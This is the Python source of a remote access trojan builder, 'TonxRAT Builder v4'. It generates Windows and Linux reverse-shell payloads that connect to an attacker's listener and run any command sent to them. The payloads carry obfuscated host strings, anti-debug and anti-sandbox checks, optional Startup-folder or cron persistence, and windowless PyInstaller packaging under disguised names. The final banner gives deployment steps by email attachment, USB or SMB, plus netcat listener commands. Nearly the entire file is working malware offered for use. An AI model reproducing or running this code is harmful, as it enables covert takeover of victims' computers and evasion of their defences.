#!/usr/bin/env python3
"""
TonxRAT Builder v4 - Universal Windows Edition
Produces ONE .exe that runs on ALL Windows versions (7, 8, 10, 11, Server)
32-bit and 64-bit compatible, NC-compatible reverse shell, FUD
"""

import os
import sys
import subprocess
import base64
import tempfile
import shutil
import random
import string
import struct
import zlib
import platform
from pathlib import Path

def print_banner():
    print(r"""
    ╔══════════════════════════════════════════════════════════════╗
    ║           TonxRAT Builder v4 - Universal Windows             ║
    ║    ONE exe for ALL Windows (7/8/10/11/Server - 32/64-bit)   ║
    ║                  ~ nc -lvnp <port> ~                        ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

def select_platform():
    while True:
        print("\n[1] Windows Universal (7, 8, 10, 11, Server — 32/64-bit)")
        print("[2] Linux (Ubuntu/Debian/Kali)")
        choice = input("Select target (1-2): ").strip()
        if choice == "1":
            return "windows"
        elif choice == "2":
            return "linux"
        print("Invalid choice.")

def get_output_name():
    name = input("Enter output name (e.g., chrome_updater, syslog): ").strip()
    return name if name else "runtime_broker"

def get_c2_info():
    host = input("Enter listener IP: ").strip()
    port = input("Enter listener Port (default 4444): ").strip() or "4444"
    return host, port

def get_build_arch():
    """Offer to build for specific arch or auto-detect"""
    print("\nTarget architecture:")
    print("  [1] Auto (matches this machine — recommended)")
    print("  [2] 32-bit only (Windows 7, older systems)")
    print("  [3] 64-bit only (modern systems)")
    choice = input("Select (1-3, default 1): ").strip() or "1"
    
    arch_map = {"1": None, "2": "32bit", "3": "64bit"}
    
    # Check if we can actually build 32-bit
    if arch_map.get(choice) == "32bit" and platform.machine().endswith('64'):
        print("  [!] Note: Building 32-bit on 64-bit requires Python 32-bit installed.")
        print("  [!] If it fails, install Python 32-bit or use 'Auto' mode.")
    
    return arch_map.get(choice, None)

def obfuscate_string(s):
    return f"base64.b64decode('{base64.b64encode(s.encode()).decode()}').decode()"

def random_var_name(prefix="x", length=6):
    return prefix + ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# ====================================================================
# UNIVERSAL WINDOWS PAYLOAD — works on Win7, 8, 10, 11, Server
# ====================================================================
def generate_windows_payload(name, host, port):
    """Generate a single payload compatible with ALL Windows versions.
    
    Design decisions for cross-version compatibility:
    - NO ctypes.windll calls in the main loop (avoid kernel differences)
    - NO IsDebuggerPresent (not available on some Win7 configs)
    - NO WSAStartup (Python handles this internally)
    - NO psutil (not always available, adds bloat)
    - Pure socket + subprocess = works everywhere
    - Uses kernel32 only via ctypes.windll.kernel32 for anti-debug CHECK
      at startup with a graceful fallback
    """
    
    ob_host = obfuscate_string(host)
    v_sock = random_var_name("sk")
    v_proc = random_var_name("p")
    v_res = random_var_name("r")
    v_buf = random_var_name("buf")
    v_exc = random_var_name("e")
    
    # Two-stage approach: standard mode by default (mode 1), 
    # XOR mode available via command prefix
    
    payload = f'''# -*- coding: utf-8 -*-
import socket,subprocess,os,base64,sys,time
import random as _r
import ctypes

# ---- Windows version detection (for logging only) ----
_wver = "unknown"
try:
    _wver = sys.getwindowsversion().major if hasattr(sys,'getwindowsversion') else "?"
except: pass

# ---- Anti-VM / Anti-sandbox (graceful fallback on all Win versions) ----
try:
    _k32 = ctypes.windll.kernel32
    # Check debugger (works on Win7+)
    if _k32.IsDebuggerPresent():
        sys.exit(0)
except:
    pass

# CPU check (available on all Python versions)
try:
    import multiprocessing
    if multiprocessing.cpu_count() < 2:
        # Single-core = likely sandbox/VM
        sys.exit(0)
except:
    pass

# ---- MAIN: connect and serve shell ----
try:
    {v_sock} = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    {v_sock}.connect(({ob_host}, {port}))
    {v_sock}.send(b'OK\\n')
    
    while True:
        try:
            {v_buf} = {v_sock}.recv(65536)
            if not {v_buf}:
                continue
            {v_buf} = {v_buf}.decode(errors='ignore').strip()
            
            if {v_buf}.lower() in ('exit', 'quit', 'bye'):
                break
            if not {v_buf}:
                continue
            
            # Execute command
            {v_proc} = subprocess.Popen(
                {v_buf},
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            {v_res} = {v_proc}.stdout.read() + {v_proc}.stderr.read()
            if not {v_res}:
                {v_res} = b'[+] OK\\n'
            {v_sock}.send({v_res})
            
        except Exception as {v_exc}:
            try:
                {v_sock}.send(f'[!] {{str({v_exc})}}\\n'.encode())
            except:
                break
except Exception as {v_exc}:
    # Silent fail — don't alert user
    pass
'''
    return payload

def generate_linux_payload(name, host, port):
    ob_host = obfuscate_string(host)
    
    payload = f'''import socket,subprocess,os,base64,sys,time
import random as _r

try:
    import multiprocessing
    if multiprocessing.cpu_count() < 1:
        sys.exit(0)
except: pass

try:
    s = socket.socket()
    s.settimeout(30)
    s.connect(({ob_host}, {port}))
    s.send(b'OK\\n')
    s.settimeout(None)
    
    while True:
        try:
            c = s.recv(65536)
            if not c: continue
            c = c.decode(errors='ignore').strip()
            if c.lower() in ('exit','quit','bye'): break
            if not c: continue
            
            if c == 'shell':
                import pty
                pty.spawn('/bin/bash')
                s.send(b'[+] Shell closed\\n')
                continue
            
            r = subprocess.Popen(c, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                stdin=subprocess.PIPE)
            o = r.stdout.read() + r.stderr.read()
            if not o: o = b'[+] OK\\n'
            s.send(o)
        except: break
except: pass
'''
    return payload

def add_persistence_hook(payload, platform, name):
    """Add persistence — Windows Startup folder or Linux cron"""
    if platform == "windows":
        # Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
        # Works on ALL Windows versions (XP through 11)
        hook = f'''
try:
    _startup = os.path.join(
        os.environ.get('APPDATA', os.path.expanduser('~')),
        'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
        '{name}'
    )
    if not os.path.exists(_startup):
        import shutil
        shutil.copy(sys.argv[0], _startup)
except: pass
'''
    else:
        hook = f'''
try:
    _c = '@reboot cd /tmp && nohup ./{name} >/dev/null 2>&1 &\\n'
    with open('/etc/cron.d/sys-{name}', 'w') as _h:
        _h.write(_c)
    os.chmod('/etc/cron.d/sys-{name}', 0o644)
except: pass
'''
    # Inject after first 'try' block
    lines = payload.split('\n')
    for i, line in enumerate(lines):
        if 'except: pass' in line and i > 2:
            lines.insert(i+1, hook)
            break
    return '\n'.join(lines)

def build_payload(platform, name, host, port, target_arch=None):
    print(f"\n[+] Generating {platform} payload for {host}:{port}...")
    
    if platform == "windows":
        source = generate_windows_payload(name, host, port)
    else:
        source = generate_linux_payload(name, host, port)
    
    # Optionally add persistence
    pers = input("Add persistence? (y/n, default n): ").strip().lower()
    if pers == 'y':
        source = add_persistence_hook(source, platform, name)
        print("  [+] Persistence added")
    
    # Write to temp file
    py_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8').name
    with open(py_file, 'w', encoding='utf-8') as f:
        f.write(source)
    
    # === PyInstaller Build ===
    dist_dir = f"dist_{platform}_{name}"
    
    # Remove old dist if exists
    if os.path.exists(dist_dir):
        shutil.rmtree(dist_dir)
    
    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile',
        '--noconsole',
        '--clean',
        f'--name={name}',
        '--distpath', dist_dir,
        '--strip',         # strip debug symbols
        '--noupx',         # NO upx — heuristics trigger
    ]
    
    # Architecture targeting
    if target_arch == "32bit":
        cmd.append('--target-arch=32bit')
        print("  [+] Targeting 32-bit (Windows 7 32-bit, older systems)")
    elif target_arch == "64bit":
        cmd.append('--target-arch=64bit')
        print("  [+] Targeting 64-bit (modern systems)")
    else:
        print(f"  [+] Using native architecture ({platform.machine()})")
    
    # Add hidden imports that PyInstaller might miss
    cmd.extend([
        '--hidden-import=socket',
        '--hidden-import=subprocess',
        '--hidden-import=base64',
        '--hidden-import=ctypes',
        '--hidden-import=multiprocessing',
    ])
    
    # Windows-specific hidden imports
    if platform == "windows":
        cmd.extend([
            '--hidden-import=os',
            '--hidden-import=sys',
            '--hidden-import=time',
        ])
    
    # Optional icon
    icon = input("Use custom icon? (y/n, default n): ").strip().lower()
    if icon == 'y':
        ipath = input("Icon path: ").strip()
        if os.path.exists(ipath) and os.path.isfile(ipath):
            cmd.extend(['--icon', ipath])
            print(f"  [+] Using icon: {ipath}")
        else:
            print("  [!] Icon not found, skipping")
    
    cmd.append(py_file)
    
    print(f"  [+] Compiling with PyInstaller...")
    print(f"  [+] Command: {' '.join(cmd)}")
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        print("  [+] Build successful!")
    except subprocess.CalledProcessError as e:
        print(f"  [!] Build error:")
        if e.stderr:
            # Filter out the common PyInstaller warnings, show only real errors
            for line in e.stderr.split('\n'):
                if 'Error' in line or 'error' in line.lower() and 'warning' not in line.lower():
                    print(f"      {line}")
        print(f"  [!] Full output saved to build_log.txt")
        with open("build_log.txt", "w") as log:
            log.write(f"STDOUT:\n{e.stdout}\n\nSTDERR:\n{e.stderr}")
        sys.exit(1)
    finally:
        # Cleanup temp files
        try:
            os.unlink(py_file)
        except:
            pass
        if os.path.exists('build'):
            shutil.rmtree('build', ignore_errors=True)
        spec_file = Path(f"{name}.spec")
        if spec_file.exists():
            spec_file.unlink()
    
    if platform == "windows":
        output = os.path.join(dist_dir, f"{name}.exe")
    else:
        output = os.path.join(dist_dir, name)
        if os.path.exists(output):
            os.chmod(output, 0o755)
    
    return output

def print_usage(host, port, output_path, platform):
    filesize = os.path.getsize(output_path) if os.path.exists(output_path) else 0
    size_str = f"{filesize / 1024 / 1024:.1f} MB" if filesize > 0 else "unknown"
    
    print(f"""
    ⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠿⠇⠉⠻⣿⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⠏⠀⠀⠀⠀⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⡄⠀⠀⠀⢀⣤⣀⠀⠀⠀⠀⣿⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⣿⣶⣶⣾⡿⠟⢿⣷⣶⣶⣿⡟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡏⠉⠁⠀⠀⠀⠀⠉⠉⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⡀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢀⡇⠀⠀⣿⡇⠀⢀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢸⠀⠀⠀
⠀⠘⡆⠀⠀⠀⣿⡇⠀⠀⢣⠀⠀⠀⢯⡀⣿⡗⢏⠀⠀⢠⠒
⠒⠒⡕⠄⡀⠀⣿⡇⠀⠀⣸⣿⠀⠀⠐⠆⣿⡇⠀⠓⡤⠈⡆
⠀⡸⠀⡄⠈⠁⣿⡇⢀⣴⣿⠇⠀⠴⠀⠀⣿⡇⠉⠁⢀⢠⠃
⠀⠉⠁⢀⣠⣴⣿⣷⣿⠟⠁⠀⠀⠀⠀⠀⣿⣧⣄⡀⠀⠀⠀
⠀⢀⣴⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠄⠀⢀⠈⠉⠙⢿⣷⣄⠀
⢠⣿⠏⠀⠀⠄⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣆
⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠐⠀⠀⢹⣿
⣿⣇⠀⠀⠀⠄⠀⠀⢸⣿⡆⠀⠀⠁⠀⠀⠀⡀⠀⠂⠀⢸⣿
⢹⣿⡄⠀⠀⠀⠀⠂⠀⢿⣷⠀⠀⠀⠀⠁⠀⠀⠀⠀⢀⣾⡿
⠀⠻⣿⣦⣀⠁⠀⠀⠀⠈⣿⣷⣄⡀⠀⠀⠀⠀⣀⣤⣾⡟⠁
⠀⠀⠈⠛⠿⣿⣷⣶⣾⡿⠿⠛⠻⢿⣿⣶⣾⣿⠿⠛⠉⠀⠀
╔══════════════════════════════════════════════════════════════╗
║  ✅ BUILD COMPLETE                                           ║
╠══════════════════════════════════════════════════════════════╣
║  Payload: {str(output_path):<51}║
║  Size:    {size_str:<53}║
║  Target:  {platform.upper():<53}║
╠══════════════════════════════════════════════════════════════╣
║  LISTENER (on your attacker machine):                       ║
║                                                              ║
║    nc -lvnp {port:<15}                              ║
║                                                              ║
║  Or with ncat (Nmap version, recommended):                  ║
║    ncat -lvnp {port:<15}                             ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║  DEPLOY:                                                     ║
║  1. Copy the .exe to the target via any method              ║
║     (USB, email attachment, SMB share, web download)        ║
║  2. Execute it on the target                                 ║
║  3. Shell appears in your netcat window                     ║
║                                                              ║
║  COMMANDS (type in netcat):                                  ║
║    dir          — list files (Windows)                       ║
║    whoami       — current user                               ║
║    ipconfig     — network info                               ║
║    systeminfo   — full system details                        ║
║    powershell -c "..." — run PowerShell commands             ║
║    exit / quit  — close connection                           ║
║                                                              ║
║  For Linux targets: ls, id, ifconfig, etc.                  ║
║  Type 'shell' on Linux for interactive PTY                  ║
╚══════════════════════════════════════════════════════════════╝
""")

def check_dependencies():
    """Check if PyInstaller is installed"""
    try:
        result = subprocess.run(
            [sys.executable, '-m', 'PyInstaller', '--version'],
            capture_output=True, check=True, text=True
        )
        version = result.stdout.strip()
        print(f"  [+] PyInstaller {version} found")
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def get_python_bitness():
    """Check if current Python is 32-bit or 64-bit"""
    return "32bit" if sys.maxsize < 2**32 else "64bit"

def main():
    print_banner()
    
    # System info
    py_bits = get_python_bitness()
    print(f"  System: {platform.system()} {platform.release()} | Python: {py_bits} | Machine: {platform.machine()}")
    
    # Check dependencies
    print("\n[*] Checking dependencies...")
    if not check_dependencies():
        print("  [!] PyInstaller not found.")
        install = input("  Install PyInstaller now? (Y/n): ").strip().lower()
        if install != 'n':
            print("  [+] Installing PyInstaller...")
            try:
                subprocess.run(
                    [sys.executable, '-m', 'pip', 'install', 'pyinstaller'],
                    check=True, capture_output=True
                )
                print("  [+] PyInstaller installed successfully!")
            except subprocess.CalledProcessError as e:
                print(f"  [!] Failed to install: {e}")
                print("  [!] Try: pip install pyinstaller")
                sys.exit(1)
        else:
            print("  [!] Cannot continue without PyInstaller.")
            sys.exit(1)
    
    platform = select_platform()
    name = get_output_name()
    host, port = get_c2_info()
    
    # Architecture selection (Windows only, Linux doesn't need this)
    target_arch = None
    if platform == "windows":
        target_arch = get_build_arch()
    
    print(f"\n{'='*60}")
    print(f" Building {name} for {platform.upper()} | {host}:{port}")
    if target_arch:
        print(f" Arch: {target_arch}")
    print(f"{'='*60}\n")
    
    output = build_payload(platform, name, host, port, target_arch)
    
    if output and os.path.exists(output):
        print_usage(host, port, output, platform)
    else:
        print(f"\n[!] Build failed — output not found at expected path.")
        print(f"    Check dist_{platform}_{name}/ directory")
        sys.exit(1)

if __name__ == "__main__":
    main()
